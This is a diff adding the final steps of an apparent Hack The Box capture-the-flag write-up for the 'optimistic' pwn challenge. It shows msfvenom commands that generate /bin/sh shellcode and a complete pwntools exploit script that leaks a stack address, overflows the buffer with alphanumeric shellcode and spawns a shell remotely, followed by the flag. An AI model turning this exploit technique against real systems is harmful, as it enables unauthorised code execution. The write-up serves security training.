@@ -293,7 +293,129 @@ shellcode = alphanumeric(shellcode)
 XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V
 ```
 
-18. 
+18. For this solution i preferred to use the third method, because the 1st & 2nd i failed and found out need to change to python 2 environment.
+19. Anyway i will show you step by step to get the payload.
+20. Let's run this command first -> `msfvenom -l payloads | grep linux` to see all payloads for linux.
+21. Let's use this one:
+
+![image](https://user-images.githubusercontent.com/70703371/210713041-9ef09c84-dd37-4f64-a887-7676938be28e.png)
+
+
+22. Since we want to convert the payload in python file, run this command -> `msfvenom -p linux/x64/exec -f python --platform linux CMD=/bin/sh`.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210713254-b6c3c210-5624-489c-a6d9-5bb694c83cb9.png)
+
+
+23. Copy that to our script.
+24. Now let's go back and use the third method.
+
+> FINAL SCRIPT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  
+        return process([exe] + argv, *a, **kw)
+
+exe = './optimistic'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+def getOffset(pattern):
+    sh = process(exe)
+    sh.sendlineafter(':', 'y')
+    sh.sendlineafter(':', 'aa')
+    sh.sendlineafter(':', 'aa')
+    sh.sendlineafter(':', '-1')
+    sh.sendlineafter(':', pattern)
+    sh.wait()
+    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
+    info('EIP/RIP offset : {i}'.format(i=offset))
+    return offset
+
+pattern = cyclic(1024)
+offset = getOffset(pattern) # got 104
+
+sh = start()
+
+sh.sendlineafter(':', 'y')
+
+# LEAK THE STACK ADDRESS
+stackAddr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
+info("Stack Address Leaked: %#x", stackAddr)
+
+## remove 96 bytes to point at RSP instead of RBP | remove 96 bytes because `local_68` buffer is 96 bytes
+stackAddr -= 96
+
+
+## create the shellcode - NEED PYTHON 2 ENV
+##shellcode =  b""
+##shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
+##shellcode += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00"
+##shellcode += b"\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e"
+##shellcode += b"\x6a\x3b\x58\x0f\x05"
+##shellcode = alphanumeric(shellcode)
+
+
+shellcode = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
+
+## payload
+
+p = flat(
+    [
+        shellcode,
+        cyclic(offset - len(shellcode)), # as the padding bytes to RIP
+        stackAddr # RBP - 96 (our shellcode)
+    ]
+)
+
+sh.sendlineafter(':','aa')
+sh.sendlineafter(':','aa')
+sh.sendlineafter(':','-1')
+sh.sendlineafter(':',p)
+
+sh.interactive()
+
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/210714446-f4a9934a-2ace-45e6-b8c8-25dca79800f1.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210714489-66799572-8443-407a-901e-9def7ff168a1.png)
+
+
+25. Great, let's test it remotely.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/210714595-ddfb16c9-7672-489c-9edd-386fb5a6e587.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210714617-8152509a-ba9d-457d-aa47-a805143d3ad3.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/210714688-9d251e23-ef2e-46f8-a517-a616ed7cded6.png)
+
+
+26. Got the flag!
+
+## FLAG
+
+```
+HTB{be1ng_negat1v3_pays_0ff!}
+```
+
+
 
 
 
